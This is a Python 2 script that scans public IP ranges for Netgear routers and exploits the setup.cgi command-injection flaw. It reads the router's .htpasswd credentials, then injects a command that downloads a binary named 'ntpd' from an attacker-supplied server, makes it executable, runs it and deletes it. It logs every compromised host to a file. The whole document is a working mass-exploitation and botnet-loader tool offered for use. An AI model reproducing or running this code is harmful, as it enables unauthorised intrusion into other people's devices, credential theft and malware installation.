import threading, urllib2, random, socket, time, sys, os

ports = [5000, 80, 8080, 8888]
blacklisted = ["127.0","10.0","192.168"]

found = 0
hosts = 0
othreads = 0

if len(sys.argv) < 4:
    sys.exit("Usage: python " + sys.argv[0] + " <threads> <start-range> <end-range> <ip>")

server_ip = sys.argv[4]

print """\nStarting Scan."""
os.system("color 0a")

def ngscanner(ip):
    global ports
    global found
    global hosts
    global othreads
    global passwords
    try:
        thisipisbad='no'
        for badip in blacklisted:
            if badip in ip:
                thisipisbad='yes'
        if thisipisbad=='yes':
            sys.exit()
        for port in ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((ip, port))
                s.close()
                ppport = port
            except:
                pass
        
        hosts += 1
        dobreak=False
        if ppport != 80:
            rs = urllib2.urlopen("http://" + ip + ":" + str(ppport) + "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=cat+/www/.htpasswd&curpath=/&currentsetting.htm=1")
        else:
            rs = urllib2.urlopen("http://" + ip + "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=cat+/www/.htpasswd&curpath=/&currentsetting.htm=1")
        if "admin:" in rs.read():
            badserver=False
        else:
	    othreads = othreads - 1
            sys.exit()
        badserver=False		
        if badserver == False:
                print "Found! -> " + ip
                if ppport != 80:
                    url = "http://" + ip + ":" + str(ppport) + "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=wget%20http://" + server_ip + "/ntpd%20-O%20/var/tmp/ntpd;%20chmod%20777%20/var/tmp/ntpd;%20/var/tmp/ntpd;%20rm%20-rf%20/var/tmp/ntpd&curpath=/&currentsetting.htm=1"
                else:
                    url = "http://" + ip + "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=wget%20http://" + server_ip + "/ntpd%20-O%20/var/tmp/ntpd;%20chmod%20777%20/var/tmp/ntpd;%20/var/tmp/ntpd;%20rm%20-rf%20/var/tmp/ntpd&curpath=/&currentsetting.htm=1"
                rs = urllib2.urlopen(url, timeout=5)
                vuln = open("netgear.txt", "a").write(ip + "\n")
                othreads = othreads - 1
    except Exception as e:
        #print e
        othreads = othreads - 1


if sys.argv[2] == "LUCKY":
    ranges = ["206.59.0.0/206.59.255.255", "94.29.100.0/94.29.255.255", "91.140.100.0/91.140.255.255", "197.89.0.0/197.89.255.255"]
    randomrange = random.choice(ranges)
    startrng = randomrange.split("/")[0]
    endrng = randomrange.split("/")[1]

if sys.argv[2] != "LUCKY":
    a = int(sys.argv[2].split(".")[0])
    b = int(sys.argv[2].split(".")[1])
    c = int(sys.argv[2].split(".")[2])
    d = int(sys.argv[2].split(".")[3])
else:
    a = int(startrng.split(".")[0])
    b = int(startrng.split(".")[1])
    c = int(startrng.split(".")[2])
    d = int(startrng.split(".")[3])
x = 0


print "Scanning " + str(a) + "." + str(b) + "." + str(c) + ".*"
while(True):
    try:

        if sys.argv[2] != "LUCKY":
            endaddr = sys.argv[3]
        else:
            endaddr = endrng
        
        d += 1

        ipaddr = str(a) + "." + str(b) + "."+str(c)+"."+str(d)

        if endaddr == (ipaddr or str(a) + "." + str(b) + "."+str(c)+"."+str(d-1)):
            if sys.argv[2] == "LUCKY":
                randomrange = random.choice(ranges)
                startrng = randomrange.split("/")[0]
                endrng = randomrange.split("/")[1]
                a = int(startrng.split(".")[0])
                b = int(startrng.split(".")[1])
                c = int(startrng.split(".")[2])
                d = int(startrng.split(".")[3])
            else:
                break

        if d > 255:
            c += 1
            d = 0
	    print "Scanning " + str(a) + "." + str(b) + "." + str(c) + ".*"

        if c > 255:
            b += 1
            c = 0
	    print "Scanning " + str(a) + "." + str(b) + "." + str(c) + ".*"
        
        if b > 255:
            a += 1
            b = 0
	    print "Scanning " + str(a) + "." + str(b) + "." + str(c) + ".*"

        ipaddr = str(a) + "." + str(b) + "."+str(c)+"."+str(d)

        if ipaddr == endaddr:
            if sys.argv[2] == "LUCKY":
                randomrange = random.choice(ranges)
                startrng = randomrange.split("/")[0]
                endrng = randomrange.split("/")[1]
                a = int(startrng.split(".")[0])
                b = int(startrng.split(".")[1])
                c = int(startrng.split(".")[2])
                d = int(startrng.split(".")[3])
            else:
                break

        othreads += 1
		
	while(othreads >= int(sys.argv[1])):
            time.sleep(1)   
        
        t = threading.Thread(target=ngscanner, args=(ipaddr,))
        t.start()
        
    except Exception as e:
        pass

print "\x1b[37mDone\x1b[37m"